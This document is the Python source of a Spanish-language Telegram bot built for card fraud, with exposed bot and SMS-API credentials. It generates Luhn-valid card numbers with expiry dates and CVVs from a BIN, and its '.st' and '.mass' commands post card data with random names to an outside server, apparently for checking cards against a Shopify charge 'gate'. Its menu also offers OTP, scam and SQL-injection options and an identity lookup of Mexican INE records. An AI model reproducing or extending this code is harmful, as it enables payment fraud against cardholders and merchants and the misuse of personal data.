import random
import re
import requests
from datetime import datetime, timedelta
from telebot import TeleBot, types
from flask import Flask, request
import time
import vonage
import threading 

datos_ine = {}
 



TOKEN = '6853277702:AAG2r4xZjOHmES4DHGNAOzT-RokcdHVLGB0'
ADMIN_BOT_TOKEN = '6382966905:AAFM2VJBxW1CqbqxPlDIZvsFdU_ztsYEXXc'
VONAGE_API_KEY = '1955502b'
VONAGE_API_SECRET = 'Invex1995000'
VONAGE_FROM_NUMBER = '242435'

bot = TeleBot(TOKEN)
app = Flask(__name__)

usuarios_autorizados_tiempo = {
    6145123951: datetime.now() + timedelta(days=30)
}
duracion_membresia = {
    '1_semana': 7,
    '15_dias': 15,
    '1_mes': 30
}

def validar_bin(bin_number):
    return bool(re.match(r'^\d{6}$', bin_number))

def card_luhn_checksum_is_valid(card_number):
    sum = 0
    num_digits = len(card_number)
    oddeven = num_digits & 1

    for count in range(num_digits):
        digit = int(card_number[count])
        if not ((count & 1) ^ oddeven):
            digit *= 2
        if digit > 9:
            digit -= 9
        sum += digit

    return (sum % 10) == 0

def generate_card_number(bin_number):
    card_number = bin_number
    while len(card_number) < 16:
        digit = random.randint(0, 9)
        card_number += str(digit)

    digits = [int(x) for x in card_number]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    checksum = sum(digits) * 9 % 10
    card_number += str(checksum)

    if not card_luhn_checksum_is_valid(card_number):
        card_number = generate_card_number(bin_number)

    return card_number

def generate_expiry_date():
    month = random.randint(1, 12)
    year = random.randint(24, 29)
    return f"{month:02}|{year:02}"

def generate_cvv():
    return str(random.randint(100, 999))

def generate_postal_code():
    return str(random.randint(10000, 99999))

def get_bin_info(bin_number):
    url = f'https://lookup.binlist.net/{bin_number}'
    response = requests.get(url)
    if response.status_code == 200:
        bin_info = response.json()
        return bin_info
    else:
        return None

# Verificar si el usuario tiene acceso total
def tiene_acceso_total(id_usuario):
    # Reemplaza el ID de ejemplo con el ID real que deseas conceder acceso total
    return id_usuario == 6145123951

# Función para otorgar autorización al usuario por 30 días
def otorgar_autorizacion(id_usuario):
    usuarios_autorizados_tiempo[id_usuario] = datetime.now() + timedelta(days=30)
    # Aquí podrías enviar un mensaje al usuario confirmando la autorización

# Generar enlace de autorización para el usuario
def generar_enlace_autorizacion(id_usuario):
    return f"http://tubot.com/autorizar/{id_usuario}"

# Endpoint para otorgar autorización al usuario
@app.route('/autorizar_usuario', methods=['POST'])
def autorizar_usuario():
    if request.method == 'POST':
        if request.headers.get('Authorization') == ADMIN_BOT_TOKEN:
            data = request.json
            if 'user_id' in data:
                id_usuario = data['user_id']
                otorgar_autorizacion(id_usuario)
                enlace = generar_enlace_autorizacion(id_usuario)
                return {'enlace': enlace}, 200
            else:
                return {'error': 'No se proporcionó el ID de usuario'}, 400
        else:
            return {'error': 'No autorizado'}, 401

# Handler para el comando protegido
@bot.message_handler(commands=['comando_protegido'])
def handle_comando_protegido(message):
    if tiene_acceso_total(message.chat.id):
        # Lógica de la función protegida
        bot.reply_to(message, "¡Acceso concedido! Esta es una función protegida.")
    else:
        bot.reply_to(message, "No tienes permiso para acceder a esta función.")
@bot.message_handler(commands=['start'])
def start(message):
    user_info_message = show_user_info(message.from_user)
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row(types.InlineKeyboardButton("Gates", callback_data='gates'))
    bot.send_message(message.chat.id, user_info_message, reply_markup=keyboard)

def show_user_info(user):
    user_info = f"Información del usuario:\n\n"
    if isinstance(user, types.User):
        user_info += f"ID: {user.id}\n"
        user_info += f"Nombre: {user.first_name}\n"
        user_info += f"Apellido: {user.last_name}\n"
        user_info += f"Nombre de usuario: @{user.username}\n"
        user_info += f"Idioma: {user.language_code}\n"
        user_info += f"Es un bot: {'Sí' if user.is_bot else 'No'}\n"
    else:
        user_info += "No se pudo obtener información del usuario.\n"
    return user_info
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'gates':
        gates_info_message = """
    ████████████████████████████████████████████████
█                                                  █
█             𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘             █
█                                                  █
█                  Loading... ████████████░░░░░░ 70%    █
█                                                  █
████████████████████████████████████████████████

  """
        keyboard_gates = types.InlineKeyboardMarkup()
        keyboard_gates.row(types.InlineKeyboardButton("Charged", callback_data='charged'),
                           types.InlineKeyboardButton("Auth", callback_data='auth'),
                           types.InlineKeyboardButton("CCN", callback_data='ccn'),
                           types.InlineKeyboardButton("Usuario", callback_data='user'))
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=gates_info_message,
                              reply_markup=keyboard_gates)
    elif call.data == 'user':
        user_info_message = show_user_info(call.from_user)
        keyboard_user = types.InlineKeyboardMarkup()
        keyboard_user.row(types.InlineKeyboardButton("Atrás", callback_data='back'))  # Botón de retroceso agregado
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=user_info_message,
                              reply_markup=keyboard_user)
    elif call.data == 'charged':
        charge_section_message = """
    𝙎𝙚𝙘𝙘𝙞𝙤́𝙣
    Charger [𝙉º 𝟎] 
    🛫 | cmd (!st - ON) [FREE]
    ☄️ | Metodo !st cc|mm|yy|cvv
    🤖 | Tipo Charge ($11.98)| Shoipify 
    👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
    ❄️ | Comments GATE ONLINE
     ══════════════════════════════════
       
     Charger [𝙉º 𝟎] 
        🛫 | cmd (!st - ON) [FREE]
        ☄️ | Metodo !st cc|mm|yy|cvv
        🤖 | Tipo Charge ($11.98)| Shoipify 
        👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
        ❄️ | Comments GATE ONLINE
        ══════════════════════════════════
        
         Charger [𝙉º 𝟎] 
        🛫 | cmd (!st - ON) [FREE]
        ☄️ | Metodo !st cc|mm|yy|cvv
        🤖 | Tipo Charge ($11.98)| Shoipify 
        👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
        ❄️ | Comments GATE ONLINE
         ══════════════════════════════════
        
         Charger [𝙉º 𝟎] 
        🛫 | cmd (!st - ON) [FREE]
        ☄️ | Metodo !st cc|mm|yy|cvv
        🤖 | Tipo Charge ($11.98)| Shoipify 
        👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
        ❄️ | Comments GATE ONLINE
         ══════════════════════════════════
    """
        keyboard_charged = types.InlineKeyboardMarkup()
        keyboard_charged.row(types.InlineKeyboardButton("Atrás", callback_data='back'))
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=charge_section_message,
                              reply_markup=keyboard_charged)
    elif call.data == 'auth':
        auth_section_message = """
        𝙎𝙚𝙘𝙘𝙞𝙤́𝙣
        Charger [𝙉º 𝟎] 
        🛫 | cmd (!st - ON) [FREE]
        ☄️ | Metodo !st cc|mm|yy|cvv
        🤖 | Tipo Charge ($11.98)| Shoipify 
        👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
        ❄️ | Comments GATE ONLINE
         ══════════════════════════════════
        
         Charger [𝙉º 𝟎] 
        🛫 | cmd (!st - ON) [FREE]
        ☄️ | Metodo !st cc|mm|yy|cvv
        🤖 | Tipo Charge ($11.98)| Shoipify 
        👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
        ❄️ | Comments GATE ONLINE
         ══════════════════════════════════
        
         Charger [𝙉º 𝟎] 
        🛫 | cmd (!st - ON) [FREE]
        ☄️ | Metodo !st cc|mm|yy|cvv
        🤖 | Tipo Charge ($11.98)| Shoipify 
        👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
        ❄️ | Comments GATE ONLINE
         ══════════════════════════════════
        
         Charger [𝙉º 𝟎] 
        🛫 | cmd (!st - ON) [FREE]
        ☄️ | Metodo !st cc|mm|yy|cvv
        🤖 | Tipo Charge ($11.98)| Shoipify 
        👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
        ❄️ | Comments GATE ONLINE
         ══════════════════════════════════
        """
        keyboard_auth = types.InlineKeyboardMarkup()
        keyboard_auth.row(types.InlineKeyboardButton("Atrás", callback_data='back'))  # Botón de retroceso agregado
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=auth_section_message,
                              reply_markup=keyboard_auth)
    elif call.data == 'ccn':
        ccn_section_message = """
        𝙎𝙚𝙘𝙘𝙞𝙤́𝙣
        Charger [𝙉º 𝟎] 
        🛫 | cmd (!tm - ON) [FREE]
        ☄️ | Metodo !st cc|mm|yy|cvv
        🤖 | Tipo Charge ($11.98)| Shoipify 
        👾 | Nombre 𝙊 - 𝙈 𝙖 𝙩 𝙞 𝙘 - § - 𝙘 𝙝 𝙚 𝙘
        ❄️ | Comments GATE ONLINE
        """
        keyboard_ccn = types.InlineKeyboardMarkup()
        keyboard_ccn.row(types.InlineKeyboardButton("Atrás", callback_data='back'))
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=ccn_section_message,
                              reply_markup=keyboard_ccn)
    elif call.data == 'back':
        user_info_message = show_user_info(bot.get_chat(call.message.chat.id))
        keyboard_back = types.InlineKeyboardMarkup()
        keyboard_back.row(types.InlineKeyboardButton("Perfil", callback_data='perfil'), 
                          types.InlineKeyboardButton("Gates", callback_data='gates'), 
                          types.InlineKeyboardButton("Tools", callback_data='tools'))
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=user_info_message,
                              reply_markup=keyboard_back)

# Manejador para el botón de menú
@bot.message_handler(commands=['menu'])
def show_menu(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    keyboard.add(
        types.KeyboardButton('SMS'),
        types.KeyboardButton('OTP'),
        types.KeyboardButton('Scams'),
        types.KeyboardButton('Saldear'),
        types.KeyboardButton('Scraping'),
        types.KeyboardButton('ADMI'),
        types.KeyboardButton('Seyer'),
        types.KeyboardButton('INE'),        # Botón adicional
        types.KeyboardButton('INJEK^SQL')  # Botón adicional
    )
    bot.send_message(message.chat.id, "Selecciona una opción del menú:", reply_markup=keyboard)

# Función para enviar SMS
@bot.message_handler(func=lambda message: message.text.startswith('.sm '))
def handle_send_sms(message):
    try:
        # Obtener el número de teléfono y el mensaje del usuario
        command_parts = message.text.split(' ', 2)
        phone_number = command_parts[1].strip()
        text = command_parts[2].strip()

        # Enviar el SMS (código para enviar SMS)

        bot.reply_to(message, f'SMS enviado correctamente a {phone_number}.')
    except IndexError:
        bot.reply_to(message, 'Por favor, proporciona un número de teléfono y un mensaje válido después del comando (.sm +523317738557 Hola).')

# URL del servidor web donde se realizarán las consultas
SERVER_URL = "https://pagina-mx.site/buscar_informacion_excel"

# Manejador para el botón "INE"
@bot.message_handler(func=lambda message: message.text == 'INE')
def handle_ine(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item = types.KeyboardButton('Ok')
    markup.add(item)
    bot.send_message(message.chat.id, "La siguiente función es totalmente privada y confidencial. Cualquier búsqueda que hagas se autodestruirá después de 5 minutos por seguridad del bot y de los usuarios. Presiona Ok para continuar.", reply_markup=markup)

# Manejador para el botón "Ok" (confirmación de búsqueda en INE)
@bot.message_handler(func=lambda message: message.text == 'Ok')
def handle_ok(message):
    # Realizar la búsqueda en el servidor web
    datos_busqueda = obtener_datos_busqueda(message)
    resultado = buscar_informacion_excel(datos_busqueda)
    
    # Mostrar el resultado al usuario
    if resultado:
        bot.reply_to(message, f"Resultado de la búsqueda en INE: {resultado}")
    else:
        bot.reply_to(message, "No se encontraron resultados para la búsqueda.")
    
    # Autodestruir los datos de búsqueda después de 5 minutos
    autodestruir_ine(message.chat.id)

# Función para obtener los datos de búsqueda del mensaje del usuario
def obtener_datos_busqueda(message):
    # Lógica para obtener los datos de búsqueda del mensaje del usuario
    # Aquí podrías solicitar al usuario el estado y los detalles de búsqueda (CURP, nombre o domicilio)
    return {
        "estado": "NombreDelEstado",
        "busqueda": "DetalleDeBusqueda"
    }

# Función para realizar la búsqueda en el servidor web
def buscar_informacion_excel(datos_busqueda):
    response = requests.post(SERVER_URL, json=datos_busqueda)
    if response.status_code == 200:
        return response.json().get("resultados")
    else:
        return None

# Función para autodestruir los datos de búsqueda después de 5 minutos
def autodestruir_ine(chat_id):
 threading.Timer(300, lambda: autodestruir_ine_callback(chat_id)).start()

def autodestruir_ine_callback(chat_id):
    # Lógica para autodestruir los datos de búsqueda
    pass

# Función para autodestruir los datos de búsqueda después de 5 minutos
def autodestruir_ine(chat_id):
    threading.Timer(300, lambda: autodestruir_ine_callback(chat_id)).start()

def autodestruir_ine_callback(chat_id):
    # Lógica para autodestruir los datos de búsqueda
    if chat_id in datos_ine:
        del datos_ine[chat_id]
# Función para manejar todos los mensajes
@bot.message_handler(func=lambda message: message.text.startswith('.bin'))
def handle_bin(message):
    # Extraer el número de BIN del mensaje del usuario
    bin_number = message.text.split('.bin ')[-1].strip()
    
    # Verificar si el número de BIN tiene 6 dígitos
    if len(bin_number) != 6 or not bin_number.isdigit():
        bot.reply_to(message, "Por favor, ingresa un número de BIN válido de 6 dígitos después de '.bin'. Por ejemplo: .bin 416916")
        return
    
    # Consultar binlist.net para obtener información del BIN
    url = f'https://lookup.binlist.net/{bin_number}'
    response = requests.get(url)
    if response.status_code == 200:
        bin_info = response.json()
        response_text = (
            "══════════════════════════════════════════════════════\n"
            "⦿ -   𝗠 𝗮 𝘁 𝗶 𝗰 - § - 𝗰 𝗵 𝗲 𝗰            \n"
            "══════════════════════════════════════════════════════\n"
            f"➤ 𝗕𝗜𝗡: {bin_number}\n"
            f"➤ 𝗕𝗔𝗡𝗖𝗢: {bin_info.get('bank', {}).get('name', 'Desconocido')}\n"
            f"➤ 𝗣𝗔Í𝗦: {bin_info.get('country', {}).get('name', 'Desconocido')}\n"
            f"➤ 𝗧𝗜𝗣𝗢: {bin_info.get('type', 'Desconocido')}\n"
            f"➤ 𝗠𝗔𝗥𝗖𝗔: {bin_info.get('scheme', 'Desconocido')}\n"
            "══════════════════════════════════════════════════════\n"
        )
        bot.reply_to(message, response_text)
    else:
        bot.reply_to(message, "Lo siento, no pude obtener información sobre ese BIN en este momento. Por favor, intenta de nuevo más tarde.")
            
            
# Función para manejar el comando .gen
@bot.message_handler(func=lambda message: message.text.startswith('.gen '))
def handle_gen_cards(message):
    bin_number = message.text.split('.gen ')[1].strip()
    if validar_bin(bin_number):
        # Obtener información del BIN
        bin_info = get_bin_info(bin_number)

        # Generar las tarjetas
        generated_cards = []
        for _ in range(15):
            card_number = generate_card_number(bin_number)
            expiry_date = generate_expiry_date()
            cvv = generate_cvv()
            generated_card = f"{card_number}|{expiry_date}|{cvv}"
            generated_cards.append(generated_card)

        # Construir el mensaje de respuesta con la información del BIN
        response_message = build_response_message(bin_number, bin_info, generated_cards)

        # Crear el teclado de regeneración
        keyboard_regen = build_regen_keyboard(bin_number)

        # Enviar el mensaje de respuesta con el teclado de regeneración
        bot.reply_to(message, response_message, reply_markup=keyboard_regen)
    else:
        bot.reply_to(message, "El BIN ingresado no es válido.")

# Función para manejar la regeneración de tarjetas al presionar el botón "Regen"
@bot.callback_query_handler(func=lambda call: call.data.startswith('regen:'))
def handle_regen(call):
    # Extraer el BIN del callback data
    bin_number = call.data.split(':')[1]

    # Generar nuevas tarjetas
    generated_cards = []
    for _ in range(15):
        card_number = generate_card_number(bin_number)
        expiry_date = generate_expiry_date()
        cvv = generate_cvv()
        generated_card = f"{card_number}|{expiry_date}|{cvv}"
        generated_cards.append(generated_card)

    # Obtener información actualizada del BIN
    bin_info = get_bin_info(bin_number)

    # Construir el mensaje actualizado con las nuevas tarjetas y la información del BIN
    response_message = build_response_message(bin_number, bin_info, generated_cards)

    # Crear el teclado de regeneración
    keyboard_regen = build_regen_keyboard(bin_number)

    # Editar el mensaje original con la nueva información y el teclado de regeneración
    bot.edit_message_text(chat_id=call.message.chat.id,
                          message_id=call.message.message_id,
                          text=response_message,
                          reply_markup=keyboard_regen)

# Función para construir el mensaje de respuesta con la información del BIN y las tarjetas generadas
def build_response_message(bin_number, bin_info, generated_cards):
    response_message = (
        "══════════════════════════════════════════════════════\n"
        "⦿ -   𝗠 𝗮 𝘁 𝗶 𝗰 - § - 𝗰 𝗵 𝗲 𝗰            \n"
        "══════════════════════════════════════════════════════\n"
        f"➤ 𝗕𝗜𝗡: {bin_number}\n"
        f"➤ 𝗕𝗔𝗡𝗖𝗢: {bin_info.get('bank', {}).get('name', 'Desconocido')}\n"
        f"➤ 𝗣𝗔Í𝗦: {bin_info.get('country', {}).get('name', 'Desconocido')}\n"
        f"➤ 𝗧𝗜𝗣𝗢: {bin_info.get('type', 'Desconocido')}\n"
        f"➤ 𝗠𝗔𝗥𝗖𝗔: {bin_info.get('scheme', 'Desconocido')}\n"
        "══════════════════════════════════════════════════════\n"
        "Nuevas tarjetas generadas:\n\n" + "\n".join(generated_cards)
    )
    return response_message

# Función para construir el teclado de regeneración
def build_regen_keyboard(bin_number):
    keyboard_regen = types.InlineKeyboardMarkup()
    keyboard_regen.row(types.InlineKeyboardButton("Regen", callback_data=f'regen:{bin_number}'))
    return keyboard_regen

# Función para manejar el comando .st
@bot.message_handler(commands=['st'])
def handle_st_command(message):
    try:
        # Extraer los datos de la tarjeta del mensaje
        card_data = message.text.split('.st ')[1].strip().split('|')
        card_number = card_data[0]
        expiry = card_data[1]
        cvv = card_data[2]
        postal_code = card_data[3]

        # Generar un nombre aleatorio y un código postal aleatorio
        ## name = generate_name()
        #postal_code = "44200"

        # Procesar el pago
        send_card_info1(card_number, postal_code, expiry, cvv)

    except IndexError:
        bot.reply_to(message, "Por favor, proporciona los datos de la tarjeta en el formato correcto: .st <card_number>|<expiry>|<cvv>")
    
# Función para enviar los datos de la tarjeta al servidor
def send_card_info1(card_number, postal_code, expiry, cvv):
    SERVER_URL = "https://linx.pythonanywhere.com/card-info"
    return requests.post(SERVER_URL, json={
        'card_number': card_number,
        'expiry': expiry,
        'cvv': cvv,
        'postal_code': postal_code
    })

# Función para manejar el comando .mass
@bot.message_handler(commands=['mass'])
def handle_mass_command(message):
    try:
        # Extraer los datos de la tarjeta del mensaje
        card_data = message.text.split('.mass ')[1].strip().split('|')
        card_number = card_data[0]
        expiry = card_data[1]
        cvv = card_data[2]

        # Enviar tarjetas en masa
        send_mass_cards(card_number, expiry, cvv, message)

    except IndexError:
        bot.reply_to(message, "Por favor, proporciona los datos de la tarjeta en el formato correcto: .mass <card_number>|<expiry>|<cvv>")

# Función para enviar una tarjeta al servidor
def send_card_info(card_number, name, postal_code, expiry, cvv, message):
    response = requests.post(SERVER_URL, json={"card_number": card_number, "name": name, "postal_code": postal_code, "expiry": expiry, "cvv": cvv})
    if response.status_code == 200:
        bot.reply_to(message, "Pago procesado correctamente.")
    else:
        bot.reply_to(message, "Error al procesar el pago. Por favor, inténtalo de nuevo más tarde.")

# Función para enviar múltiples tarjetas al servidor
def send_mass_cards(card_number, expiry, cvv, message):
    progress_message = bot.send_message(message.chat.id, "Enviando tarjetas al servidor... [░░░░░░░░░░] 0%")
    for i in range(15):
        name = generate_name()
        postal_code = generate_postal_code()
        send_card_info(card_number, name, postal_code, expiry, cvv, message)

        time.sleep(1)  # Esperar un segundo entre cada envío para simular el proceso

        # Actualizar la barra de progreso
        progress = (i + 1) * 100 / 15
        progress_bar = "[" + "▓" * int(progress / 5) + "░" * (20 - int(progress / 5)) + f"] {int(progress)}%"
        bot.edit_message_text(chat_id=progress_message.chat.id, message_id=progress_message.message_id, text=f"Enviando tarjetas al servidor... {progress_bar}")

    bot.send_message(message.chat.id, "Se han enviado todas las tarjetas al servidor.")

# Función para generar un nombre aleatorio
def generate_name():
    nombres = ['Juan', 'María', 'Luis', 'Ana', 'Carlos', 'Laura', 'Pedro', 'Sofía', 'Diego', 'Lucía']
    apellidos = ['García', 'Rodríguez', 'Martínez', 'Hernández', 'López', 'González', 'Pérez', 'Sánchez', 'Romero', 'Díaz']
    nombre = random.choice(nombres)
    apellido = random.choice(apellidos)
    return f"{nombre} {apellido}"

# Función para generar un código postal aleatorio
def generate_postal_code():
    postal_codes = ['28001', '08001', '41001', '48001', '03001', '46001', '28002', '08002', '41002', '48002']
    return random.choice(postal_codes)


bot.polling()
                                                      
